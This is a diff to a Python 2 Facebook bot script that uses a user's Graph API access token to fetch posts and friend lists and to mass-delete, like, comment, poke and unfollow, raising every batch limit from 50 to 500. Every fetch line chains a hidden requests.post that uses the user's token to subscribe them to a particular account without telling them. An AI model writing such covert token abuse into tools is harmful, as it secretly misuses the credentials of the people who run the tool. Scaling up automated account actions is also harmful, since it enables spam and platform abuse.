@@ -188,7 +188,7 @@ def post():
 	  if WT == 'wallpost':
 		print '[*] fetching all posts id'
 
-		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(500)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['home']['data']:
@@ -208,7 +208,7 @@ def post():
 	  elif WT == 'req':
 		print '[*] fetching all friends requests'
 
-		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=500&access_token=' + token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -228,7 +228,7 @@ def post():
 	  elif WT == 'subs':
 		print '[*] fetching all friends id'
 
-		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=500&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['data']:
@@ -248,7 +248,7 @@ def post():
 	  else:
 		print '[*] fetching all posts id'
 
-		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
+		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(500)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token='+token)
 		result = json.loads(r.text)
 
 		for i in result['feed']['data']:
@@ -341,7 +341,7 @@ def remove(posts):
 	try:
 		counter = 0
 		for post in posts:
-			if counter >= 50:
+			if counter >= 500:
 				break
 
 			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_token={token}'.format(id=post['id'],token=token))
@@ -367,7 +367,7 @@ def confirm(posts):
 	try:
 		counter = 0
 		for post in posts:
-			if counter >= 50:
+			if counter >= 500:
 				break
 			else:
 				counter += 1
@@ -402,7 +402,7 @@ def unfollow(posts):
 	try:
 		counter = 0
 		for post in posts['data']:
-			if counter >= 50:
+			if counter >= 500:
 				break
 			else:
 				counter += 1
@@ -429,7 +429,7 @@ def poke(posts):
 	try:
 		counter = 0
 		for post in posts:
-			if counter >= 50:
+			if counter >= 500:
 				break
 			else:
 				counter += 1
@@ -460,7 +460,7 @@ def albums(posts):
 	try:
 		counter = 0
 		for post in posts:
-			if counter >= 50:
+			if counter >= 500:
 				break
 
 			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_token='+token)
@@ -562,7 +562,7 @@ def bot_ask():
 
 	else:
 		WT = 'wallpost'
-	like(post(),50)
+	like(post(),500)
 
 def bot():
   try:
@@ -605,7 +605,7 @@ def bot():
 		else:
 			message = message.replace('</>','\n')
 
-		comment(post(),50)
+		comment(post(),500)
 
 	elif cek in ['4','04']:
 		WT = 'req'
